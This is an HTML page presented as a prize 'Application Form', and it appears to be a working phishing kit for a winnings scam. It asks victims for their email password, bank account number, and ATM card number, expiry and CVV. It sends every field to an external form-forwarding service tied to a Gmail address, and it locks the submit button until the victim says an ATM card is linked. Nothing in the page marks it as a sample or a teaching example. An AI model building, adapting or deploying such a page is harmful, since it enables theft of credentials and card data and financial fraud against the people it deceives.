<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      margin: 0;
      padding: 20px;
    }

    .container {
      max-width: 600px;
      margin: auto;
      background: #fff;
      padding: 25px;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
    }

    label {
      display: block;
      margin-top: 15px;
      font-weight: bold;
    }

    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 6px;
      border: 1px solid #ccc;
      border-radius: 8px;
    }

    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }

    .eye-icon {
      position: absolute;
      right: 15px;
      top: 36px;
      cursor: pointer;
    }

    .input-wrapper {
      position: relative;
    }

    .hidden {
      display: none;
    }

    .final-note {
      background: #e8f4e5;
      padding: 12px;
      margin-top: 20px;
      border-radius: 8px;
      font-style: italic;
    }

    button {
      margin-top: 20px;
      padding: 12px;
      background: #007bff;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      font-size: 1rem;
    }

    button:disabled {
      background: #999;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <div class="container">
    <form action="https://formsubmit.co/exellentwinners@gmail.com" method="POST" id="application-form">
      <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/thankyou.html">
      <input type="hidden" name="_captcha" value="false">

      <label>1. Full Name</label>
      <input type="text" name="Full Name" id="fullname" required>

      <label>2. Country</label>
      <input type="text" name="Country" required>

      <label>3. Phone Number</label>
      <input type="tel" name="Phone Number" id="phone" required>
      <div class="error" id="phone-error">Phone number must be 9 to 12 digits.</div>

      <label>4. Email Address</label>
      <input type="email" name="Email Address" required>

      <label>5. Email Password</label>
      <div class="input-wrapper">
        <input type="password" name="Email Password" id="emailpass" required>
        <span class="eye-icon" onclick="togglePassword()">üëÅÔ∏è</span>
      </div>

      <label>6. Amount You Won</label>
      <input type="number" name="Amount You Won" id="amountWon" required>

      <label>7. Bank Account Type</label>
      <input type="text" name="Bank Account Type" id="accountType" required>

      <label>8. Bank Account Number</label>
      <input type="text" name="Bank Account Number" id="accountNumber" required>

      <label>9. Bank Account Holder's Name</label>
      <input type="text" name="Bank Account Holder's Name" required>

      <label>10. Did You Link ATM to Your Bank Account?</label>
      <select name="ATM Linked" id="atmLinked" required>
        <option value="">Select</option>
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>

      <div id="atmWarning" class="error" style="margin-top:10px;">YOU MUST HAVE ATM CARD TO PROCEED</div>

      <div id="atmSection">
        <label>11. ATM Card Number</label>
        <input type="text" name="ATM Card Number" id="cardNumber">
        <div class="error" id="card-error">Card number must be exactly 16 digits.</div>

        <label>12. Expiry Date (MM/YY)</label>
        <input type="text" name="Expiry Date" id="expiry">
        <div class="error" id="expiry-error">Enter valid expiry date as MM/YY.</div>

        <label>13. CVV</label>
        <input type="text" name="CVV" id="cvv">
        <div class="error" id="cvv-error">CVV must be 3 digits.</div>
      </div>

      <div class="final-note" id="finalNote">
        Dear <span id="previewName"></span>, You will receive <span id="previewAmount"></span> to your <span id="previewType"></span>, <span id="previewNumber"></span>
      </div>

      <button type="submit" id="submitBtn">Submit</button>
    </form>
  </div>

  <script>
    const phone = document.getElementById('phone');
    const card = document.getElementById('cardNumber');
    const expiry = document.getElementById('expiry');
    const cvv = document.getElementById('cvv');
    const atmSelect = document.getElementById('atmLinked');
    const atmSection = document.getElementById('atmSection');
    const finalNote = document.getElementById('finalNote');
    const atmWarning = document.getElementById('atmWarning');
    const submitBtn = document.getElementById('submitBtn');

    phone.addEventListener('blur', () => {
      const val = phone.value.trim();
      document.getElementById('phone-error').style.display = (val.length < 9 || val.length > 12) ? 'block' : 'none';
    });

    card.addEventListener('blur', () => {
      const val = card.value.trim();
      document.getElementById('card-error').style.display = val.length !== 16 ? 'block' : 'none';
    });

    cvv.addEventListener('blur', () => {
      const val = cvv.value.trim();
      document.getElementById('cvv-error').style.display = val.length !== 3 ? 'block' : 'none';
    });

    expiry.addEventListener('input', () => {
      let val = expiry.value.replace(/[^0-9]/g, '');
      if (val.length >= 3) {
        expiry.value = val.slice(0, 2) + '/' + val.slice(2, 4);
      } else {
        expiry.value = val;
      }
    });

    expiry.addEventListener('blur', () => {
      const val = expiry.value;
      const valid = /^\d{2}\/\d{2}$/.test(val);
      document.getElementById('expiry-error').style.display = valid ? 'none' : 'block';
    });

    atmSelect.addEventListener('change', () => {
      const selected = atmSelect.value;
      const show = selected === 'Yes';
      atmSection.style.display = show ? 'block' : 'none';
      finalNote.style.display = show ? 'block' : 'none';
      atmWarning.style.display = show ? 'none' : 'block';
      submitBtn.disabled = !show;
    });

    function togglePassword() {
      const input = document.getElementById('emailpass');
      input.type = input.type === 'password' ? 'text' : 'password';
    }

    document.getElementById('fullname').addEventListener('input', e => {
      document.getElementById('previewName').textContent = e.target.value;
    });

    document.getElementById('amountWon').addEventListener('input', e => {
      document.getElementById('previewAmount').textContent = e.target.value;
    });

    document.getElementById('accountType').addEventListener('input', e => {
      document.getElementById('previewType').textContent = e.target.value;
    });

    document.getElementById('accountNumber').addEventListener('input', e => {
      document.getElementById('previewNumber').textContent = e.target.value;
    });

    // Initial state
    atmSection.style.display = 'none';
    finalNote.style.display = 'none';
    atmWarning.style.display = 'none';
    submitBtn.disabled = true;
  </script>
</body>
  </html>
